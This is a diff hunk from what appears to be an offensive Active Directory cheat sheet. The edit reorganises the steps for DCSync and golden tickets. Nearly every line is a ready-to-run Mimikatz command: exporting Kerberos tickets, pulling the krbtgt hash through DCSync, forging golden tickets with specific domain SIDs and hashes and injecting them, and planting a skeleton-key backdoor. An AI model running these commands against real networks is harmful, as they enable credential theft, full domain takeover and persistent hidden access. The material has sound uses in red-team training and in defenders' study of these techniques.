@@ -71,11 +71,9 @@ Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
 	2. On any machine 
 		a. Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:domain.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 
-To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges: 
-	• Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"' 
-Using the DCSync option needs no code execution (no need to run Invoke-Mimikatz) on the target DC
-
-Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500 /groups:512 /ptt"'
+To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges. Using the DCSync option needs no code execution (no need to run Invoke-Mimikatz) on the target DC: 
+	1. Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
+	2. Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500 /groups:512 /ptt"'
 
 ## Skeleton Key
 Invoke-Mimikatz -Command '"misc::skeleton"'
